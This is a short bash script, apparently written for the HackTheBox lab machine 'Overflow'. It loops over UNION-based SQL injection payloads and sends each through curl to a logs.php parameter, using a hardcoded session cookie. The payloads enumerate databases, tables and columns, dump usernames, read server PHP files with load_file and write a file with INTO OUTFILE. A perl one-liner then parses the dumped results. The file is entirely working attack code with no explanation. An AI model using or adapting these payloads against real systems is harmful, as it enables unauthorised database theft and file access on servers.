#!/bin/bash
declare -a payloads=(
    $'%40%40version+--+-'
    $'database()+--+-'
    $'group_concat(table_name)+from+information_schema.tables+where+table_schema+%3d+database()+--+-'
    $'group_concat(column_name)+from+information_schema.columns+where+table_schema+%3d+database()+and+table_name+%3d\'userlog\'+--+-'
    $'group_concat(USERNAME)+from+userlog+--+-'
    $'load_file("/var/www/html/admin_cms_panel/admin/login.php")+--+-'
    $'load_file("/srv/http/admin_cms_panel/admin/login.php")+--+-'
    $'"text"+into+outfile+"/srv/http/admin_cms_panel/tmp/test.txt"+--+-'
    $'group_concat(table_name)+from+information_schema.tables+where+table_schema+%3d+\'cmsmsdb\'+--+-'
    $'group_concat(table_name)+from+information_schema.tables+where+table_schema+%3d+\'Overflow\'+--+-'
    $'group_concat(table_name)+from+information_schema.tables+where+table_schema+%3d+\'develop\'+--+-'
    $'group_concat(column_name)+from+information_schema.columns+where+table_schema+%3d+\'Overflow\'+and+table_name+%3d\'users\'+--+-'
    $'group_concat(*)+from+\'cmsmsdb\'.\'cms_additional_users\'+--+-')
for p in "${payloads[@]}"; do
    curl -i -s -k -X $'GET' \
        -H $'Host: overflow.htb' \
        -b $'auth=A54aWjWWqj93DBpOuslsPwAAAAAAAAAA; CMSSESSIDf25decdf38ae=rcli3spa091baa9gtfjpgfkpd0' \
        -x $'http://127.0.0.1:8080' \
        $'http://overflow.htb/home/logs.php?name=admin\')+UNION+ALL+SELECT+NULL,NULL,'"${p}"
done

# perl -ne $'m#Last login : ([a-zA-Z].*)?</div><br>(=+)?$#gi && print $1."\n"' dump
